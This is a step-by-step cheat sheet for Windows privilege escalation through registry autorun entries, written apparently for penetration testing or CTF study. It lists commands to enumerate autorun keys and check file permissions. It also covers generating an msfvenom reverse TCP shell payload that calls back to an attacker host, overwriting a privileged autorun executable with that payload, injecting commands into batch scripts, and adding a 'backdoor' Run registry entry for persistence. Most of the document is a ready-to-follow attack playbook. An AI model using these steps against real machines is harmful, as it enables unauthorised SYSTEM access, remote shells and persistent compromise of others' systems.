# Windows Privilege Escalation – Registry Autoruns

## Purpose

This file provides a structured workflow for identifying and exploiting registry-based autorun entries for privilege escalation.

Core rules:
- Autoruns execute programs automatically at startup or login
- Writable autorun targets = privilege escalation
- Focus on entries executed by SYSTEM or admin users
- Always map registry → file → execution context

---

## 0. Mental Model

Registry autoruns define programs that run automatically.

If:
- a privileged context executes them
AND
- you can modify the target file or path

→ you control execution

---

## 1. Enumerate Autorun Keys (CRITICAL FIRST STEP)

cmd:

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run

---

## 2. Additional Autorun Locations

Check:

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

---

## 3. Extract Program Paths

Example output:

ProgramName    REG_SZ    C:\Program Files\App\app.exe

Focus on:
- executable path
- script path
- command arguments

---

## 4. Check File Permissions (CRITICAL)

icacls "C:\Program Files\App\app.exe"

Look for:
- (F) Full control
- (M) Modify
- write access for Users / Everyone

---

## 5. Check Directory Permissions

icacls "C:\Program Files\App\"

If writable:
→ replace executable

---

## 6. Confirm Execution Context

Determine:
- does this run as SYSTEM?
- or as logged-in user?

HKLM keys:
→ often SYSTEM or admin context

HKCU keys:
→ user context (less useful unless lateral)

---

## 7. Exploit: Replace Executable

### Step 1: Backup

copy app.exe app.bak

---

### Step 2: Create payload

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o app.exe

---

### Step 3: Replace

copy /Y payload.exe "C:\Program Files\App\app.exe"

---

## 8. Trigger Execution

Options:

- reboot system
- log off / log in
- wait for scheduled run

---

## 9. Verify SYSTEM

whoami

Expected:

nt authority\system

---

## 10. Alternative: Script Injection

If autorun uses script:

echo powershell -c "..." >> script.bat

---

## 11. Alternative: Add New Autorun Entry

If registry writable:

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\path\payload.exe"

---

## 12. Use Autoruns Tool (VERY USEFUL)

Autoruns.exe (Sysinternals)

Shows:
- all autorun locations
- file paths
- execution context

---

## 13. Common Failure Points

- autorun runs as low-priv user
- file not writable
- directory not writable
- execution not triggered
- AV removes payload

---

## 14. If Stuck

- re-check permissions
- check directory instead of file
- verify execution context
- try different autorun key

---

## 15. Quick Exploit Pattern

1. enumerate autorun keys
2. identify executable path
3. check permissions
4. replace executable
5. trigger execution
6. get SYSTEM shell

---

## 16. Mental Model

Autorun = automatic execution  
Writable file = control  
Privileged context = escalation  

---

## 17. Golden Rules

- Always check HKLM autoruns first
- Always verify file permissions
- Directory write access is often enough
- Reboot/logon triggers execution
- Keep payload simple if AV present